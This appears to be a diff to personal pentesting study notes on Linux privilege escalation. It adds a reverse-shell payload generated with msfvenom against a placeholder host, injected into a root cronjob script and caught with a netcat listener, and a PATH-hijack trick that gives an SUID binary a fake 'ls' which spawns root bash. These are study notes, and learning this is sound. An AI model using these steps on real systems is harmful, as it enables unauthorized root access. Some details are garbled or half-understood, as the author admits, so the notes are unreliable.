@@ -31,6 +31,16 @@ To display contents of the root user’s crontab, use the less command:
 ```crontab -l```	: to list all the cronjobs for the current user
 
 ```cat /etc/crontab```	: to view what cron jobs are scheduled
+Cronjob's format : ID Minute Hour Day-of-month month Day-of-week user(what user the command will run as) Command
+```
+#  m   h dom mon dow user  command
+17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
+```
+To exploit it : If a cronjob owned by root runs every few moments but the cronjob itself isn't protected, we can use it to run our own commands.
+Let's create a PAYLOAD using MSFVENOM on our *host machine*.
+```msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R```
+Now we insert this payload into the autoscript file (which is running by the cronjob), we listen on our host machine using ```nc -lvp 8888```, wait for a few minutes and that's it, we're root !
+But honestly, I didnt get the last parts using msfvenom and netcat.
 
 ### SUID/GUID
 
@@ -83,7 +93,14 @@ Simple Bash script that performs common commands related to privEsc.
 curl -O https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 ```
 
+### Exploiting PATH variable
 
+The PATH variable specifies directories that hold executable programs.
+If we have an SUID binary, we can re-write the PATH variable to a location of our choosing, so when the SUID binary calls the system shell to run an exec, it runs one that we've written instead. As with any SUID file, it will run this command with the same privileges as the owner of the SUID file ! If this is root, using this method we can run whatever commands we like as root!
+For example, when we run the SUID binary, it seems like it runs the ```ls``` command. Then we go to /tmp, and create a script with the same name as the SUID, that will launch a bash (as root) ! ```echo "/bin/bash" > ls```.
+Now if we want to use the real ls, we can do ```/bin/ls``` using the absolute path.
+We need to change the PATH variable, so that it points to the dir where we have our imitation *ls* stored. ```export PATH=/tmp:```
+Now running the script again, we gain a shell with root access ! we can therefor change back the PATH variable to ```export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH```
 ## Web Fondamentals
 
 Once the browser knows the IP address (thanks to the DNS), it can ask for the web page using GET REQUEST (http verb). Extra resources like jss, images, css... get their own GET REQUEST.
